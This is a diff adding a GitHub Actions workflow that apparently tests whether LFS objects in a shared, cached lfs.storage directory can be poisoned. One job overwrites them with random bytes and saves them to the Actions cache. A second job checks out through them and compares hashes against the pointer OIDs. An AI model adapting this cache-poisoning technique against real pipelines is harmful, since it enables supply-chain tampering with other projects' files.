@@ -1,0 +1,98 @@
+name: CH-003 Shared lfs.storage
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  plant-poison:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+      with:
+        lfs: false
+    - name: Fetch + poison LFS objects
+      env:
+        GIT_LFS_SKIP_SMUDGE: "1"
+      run: |
+        mkdir -p evidence
+        git lfs install --local
+        git lfs fetch origin 2>&1 | tee evidence/plant-lfs-fetch.txt
+        git lfs checkout 2>/dev/null || true
+        echo "=== CH-003: Plant poison in shared storage ==="
+        SHARED_DIR="/tmp/shared-lfs-storage"
+        git config lfs.storage "$SHARED_DIR"
+        echo "lfs.storage=$SHARED_DIR" | tee evidence/lfs-storage-config.txt
+        git lfs fetch origin 2>&1 | tee evidence/plant-lfs-fetch-shared.txt || true
+        find "$SHARED_DIR/objects" -type f 2>/dev/null | sort | while read obj; do
+          ORIGINAL_SIZE=$(stat -c%s "$obj")
+          ORIGINAL_SHA=$(sha256sum "$obj" | awk '{print $1}')
+          dd if=/dev/urandom of="$obj" bs=1 count="$ORIGINAL_SIZE" 2>/dev/null
+          POISON_SHA=$(sha256sum "$obj" | awk '{print $1}')
+          echo "$obj original=$ORIGINAL_SHA poison=$POISON_SHA size=$ORIGINAL_SIZE" >> evidence/poison-manifest.txt
+        done
+    - name: Save poisoned shared storage
+      uses: actions/cache/save@v4
+      with:
+        path: /tmp/shared-lfs-storage
+        key: ch003-shared-lfs-storage
+    - name: Upload plant evidence
+      uses: actions/upload-artifact@v4
+      with:
+        name: ch003-plant-${{ github.run_id }}
+        path: evidence/
+        retention-days: 90
+
+  consume-poison:
+    needs: plant-poison
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+      with:
+        lfs: false
+    - name: Restore shared poisoned storage
+      uses: actions/cache/restore@v4
+      with:
+        path: /tmp/shared-lfs-storage
+        key: ch003-shared-lfs-storage
+    - name: Configure lfs.storage to shared dir + checkout
+      continue-on-error: true
+      run: |
+        mkdir -p evidence
+        SHARED_DIR="/tmp/shared-lfs-storage"
+        git lfs install --local
+        git config lfs.storage "$SHARED_DIR"
+        echo "lfs.storage=$SHARED_DIR" | tee evidence/consume-lfs-storage-config.txt
+        ls -la "$SHARED_DIR/objects/" 2>/dev/null | head -5 | tee evidence/shared-storage-manifest.txt || true
+        git lfs fetch origin 2>&1 | tee evidence/consume-lfs-fetch.txt || true
+        git lfs checkout 2>&1 | tee evidence/consume-lfs-checkout.txt || true
+        echo "lfs_checkout_rc=$?" >> evidence/consume-checkout-rc.txt
+    - name: V3 - Shared storage contamination check
+      run: |
+        mkdir -p evidence
+        echo "=== CH-003: Shared lfs.storage Propagation ==="
+        LFS_RC=$(cat evidence/consume-checkout-rc.txt 2>/dev/null | tr -dc '0-9' | tail -c1)
+        STORAGE_CFG=$(cat evidence/consume-lfs-storage-config.txt 2>/dev/null)
+        for f in $(git lfs ls-files 2>/dev/null | awk '{print $2}' | head -5); do
+          if [ -f "$f" ]; then
+            POINTER_OID=$(git cat-file -p "HEAD:$f" 2>/dev/null | grep 'oid sha256:' | sed 's/oid sha256://' | tr -d '[:space:]')
+            ACTUAL_SHA=$(sha256sum "$f" 2>/dev/null | awk '{print $1}')
+            MATCH="false"
+            if [ -n "$POINTER_OID" ] && [ "$ACTUAL_SHA" = "$POINTER_OID" ]; then
+              MATCH="true"
+            fi
+            echo "file=$f pointer_oid=$POINTER_OID actual_sha=$ACTUAL_SHA oid_match=$MATCH lfs_checkout_rc=$LFS_RC lfs_storage=$STORAGE_CFG" >> evidence/ch003-result.json
+          fi
+        done
+        cat evidence/ch003-result.json 2>/dev/null || true
+    - name: Upload consume evidence
+      uses: actions/upload-artifact@v4
+      with:
+        name: ch003-consume-${{ github.run_id }}
+        path: evidence/
+        retention-days: 90
+    - name: Print verdict
+      run: |
+        echo "## CH-003: Shared lfs.storage Verdict" >> $GITHUB_STEP_SUMMARY
+        cat evidence/ch003-result.json 2>/dev/null >> $GITHUB_STEP_SUMMARY || true
